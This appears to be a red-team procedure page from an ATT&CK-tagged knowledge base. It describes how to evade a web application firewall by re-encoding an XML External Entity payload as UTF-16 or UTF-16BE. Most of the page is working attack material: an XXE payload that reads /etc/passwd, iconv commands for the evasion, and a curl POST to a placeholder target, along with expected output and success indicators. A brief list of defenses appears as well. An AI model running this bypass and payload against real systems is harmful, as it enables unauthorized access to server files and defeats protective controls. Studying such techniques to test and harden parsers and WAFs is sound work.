---
type: procedure
verified: true
submitted: false
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
tactics:
  - '[[tactics/Collection|TA0009 - Collection]]'
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
techniques:
  - '[[techniques/Data from Local System|T1005 - Data from Local System]]'
  - >-
    [[techniques/Obfuscated Files or Information|T1027 - Obfuscated Files or
    Information]]
sub_techniques: []
tags:
  - '[[tags/Bypass via character encoding]]'
  - '[[tags/WAF Bypasses]]'
  - '[[tags/XML External Entity]]'
commands:
  - '[[commands/iconv-convert-utf8-to-utf16]]'
  - '[[commands/iconv-convert-utf8-to-utf16be]]'
platforms:
  - Web
  - Linux
tools: []
validated: true
---

# XML External Entity WAF Bypass via Character Encoding

## Summary

This procedure outlines a technique to bypass Web Application Firewalls (WAFs) that protect against XML External Entity (XXE) attacks by converting the malicious XML payload from UTF-8 to alternative encodings like UTF-16 and UTF-16BE. This obfuscation evades signature-based detection, allowing attackers to exploit XXE for local file disclosure, remote code execution, or denial-of-service in vulnerable XML-parsing applications.

## Description

XML External Entity (XXE) vulnerabilities arise when an XML parser processes untrusted input containing external entity declarations, potentially leading to file reads, SSRF, or DoS. WAFs commonly block known XXE patterns in ASCII or UTF-8, but converting the payload to UTF-16 (Unicode 16-bit encoding) or UTF-16BE (big-endian variant) alters the byte representation, bypassing shallow inspections. This method is effective against WAFs like ModSecurity or Cloudflare that do not normalize encodings before rule application. The target is typically a web application accepting XML uploads or POSTs (e.g., SOAP APIs, document parsers). Success enables data exfiltration from the server, such as configuration files or sensitive data.

## Requirements

1. Network access to a web application with an XXE-vulnerable XML endpoint protected by a WAF.
2. Basic knowledge of XXE payloads and tools for intercepting/submitting HTTP requests (e.g., Burp Suite).
3. Linux/macOS environment with iconv utility installed (standard on most Unix-like systems).
4. A crafted base XXE payload targeting local files or internal resources.

## Defense

- Configure XML parsers to disable external entity resolution (e.g., set DTD processing to prohibit in Java's DocumentBuilderFactory or PHP's libxml).
- Deploy advanced WAFs with encoding normalization and deep XML inspection capabilities.
- Validate and sanitize XML input by rejecting DTDs entirely and using secure parsers like defusedxml in Python.
- Monitor for anomalous file access logs and XML parsing errors in application logs.

## Objectives

1. Obfuscate an XXE payload using character encoding to evade WAF detection.
2. Submit the encoded payload to extract local system data (e.g., /etc/passwd).
3. Confirm bypass success through response analysis, enabling further exploitation like RCE.
4. Demonstrate the impact of incomplete WAF coverage on XML inputs.

## Instructions

### Step 1: Prepare Base XXE Payload

**Context**: Begin by creating a standard UTF-8 encoded XXE payload that attempts to read a sensitive local file. This serves as the input for encoding steps. The payload uses an external entity to include file contents in the XML response.

Create a file named `base_xxe.xml`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

> This declares an entity `xxe` referencing `/etc/passwd`. When parsed, it embeds the file contents where `&xxe;` is referenced. Test this base payload first to confirm XXE vulnerability (expect WAF block).

### Step 2: Convert Payload to UTF-16 Encoding

**Context**: Transform the base payload to UTF-16 to alter its byte structure, potentially evading WAF rules tuned for UTF-8/ASCII patterns. UTF-16 introduces null bytes and wider characters, which may disrupt regex-based detection.

**Command** ([[commands/iconv-convert-utf8-to-utf16]]):

```bash
cat base_xxe.xml | iconv -f UTF-8 -t UTF-16 > utf16_xxe.xml
```

> The `iconv` utility performs the encoding conversion. Input is piped from the base file, output redirected to a new file. Verify the conversion with `file utf16_xxe.xml` (should indicate UTF-16 Unicode text). This step is performed because many WAFs fail to decode UTF-16 before inspection.

### Step 3: Convert Payload to UTF-16BE Encoding

**Context**: If UTF-16 fails to bypass, use UTF-16 Big Endian (BE) for additional obfuscation. The byte order difference (big vs. little endian) can further confuse WAF parsers expecting standard UTF-16LE.

**Command** ([[commands/iconv-convert-utf8-to-utf16be]]):

```bash
cat base_xxe.xml | iconv -f UTF-8 -t UTF-16BE > utf16be_xxe.xml
```

> Similar to Step 2, but specifies `-t UTF-16BE` for big-endian output. This variant is useful against WAFs that partially handle UTF-16 but not endianness variations. Check with `file utf16be_xxe.xml`.

### Step 4: Test Encoded Payload Against Target

**Context**: Submit the encoded XML via HTTP POST to the vulnerable endpoint, ensuring the Content-Type header matches the encoding. Monitor for WAF blocks (e.g., 403 responses) vs. successful parsing.

Use curl to send the payload:

```bash
curl -X POST -H "Content-Type: application/xml; charset=UTF-16" --data-binary @utf16_xxe.xml http://target.com/xml-endpoint
```

> Replace the URL with the actual endpoint. For UTF-16BE, adjust charset to `UTF-16BE`. If bypassed, the response XML will include the file contents in the `<foo>` element. Use a proxy like Burp to inspect and iterate encodings if needed.

**Expected Output**: HTTP 200 response with XML containing embedded file data, e.g., `root:x:0:0:root:/root:/bin/bash` from /etc/passwd.

**Success Indicators**:
- No WAF rejection (status code 200 or 201).
- Response parses as valid XML with entity expansion (file contents visible).
- Application logs show no blocking events for the request.
